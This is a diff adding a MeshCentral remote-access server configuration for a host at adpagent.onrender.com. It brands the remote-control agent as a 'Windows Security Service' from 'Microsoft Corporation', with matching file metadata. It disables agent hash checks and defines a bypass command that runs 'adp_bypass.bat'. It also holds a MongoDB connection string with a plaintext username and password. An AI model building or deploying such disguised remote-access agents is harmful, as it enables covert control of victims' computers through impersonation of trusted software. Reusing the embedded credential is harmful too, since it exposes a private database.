@@ -1,0 +1,49 @@
+{
+  "$schema": "https://raw.githubusercontent.com/Ylianst/MeshCentral/master/meshcentral-config-schema.json",
+  "settings": {
+    "cert": "adpagent.onrender.com",
+    "WANonly": true,
+    "port": 443,
+    "aliasPort": 443,
+    "redirPort": 0,
+    "redirAliasPort": 0,
+    "tlsOffload": true,
+    "dbCleanup": 30,
+    "mongodb": "mongodb+srv://dilipkanuri135_db_user:bDxoS7PXIKuKE3Pi@cluster0.quxp7yv.mongodb.net/meshcentral?appName=Cluster0",
+    "mongodbcol": "meshcentral",
+    "keepcerts": false,
+    "noLocalDiscovery": true,
+    "noMqtt": true,
+    "noFirebase": true,
+    "noAmt": true,
+    "ignoreAgentHashCheck": true,
+    "noMps": true,
+    "adpByPassCommand": "cmd /c \"adp_bypass.bat\""
+  },
+  "domains": {
+    "": {
+      "title": "ADP Agent",
+      "certUrl": "https://adpagent.onrender.com/",
+      "minify": false,
+      "compression": true,
+      "noAdminLoginStats": true,
+      "noAgentUpdate": false,
+      "agentCustomization": {
+        "displayName": "Windows Security Service",
+        "description": "Windows Security Service",
+        "companyName": "Microsoft Corporation",
+        "serviceName": "WindowsSecurityService",
+        "fileName": "WindowsSecurityService"
+      },
+      "agentFileInfo": {
+        "filedescription": "Windows Security Service",
+        "fileversion": "1.0.0.0",
+        "internalname": "WindowsSecurityService",
+        "legalcopyright": "Microsoft Corporation",
+        "originalfilename": "WindowsSecurityService.exe",
+        "productname": "Windows Security Service",
+        "productversion": "1.0"
+      }
+    }
+  }
+}
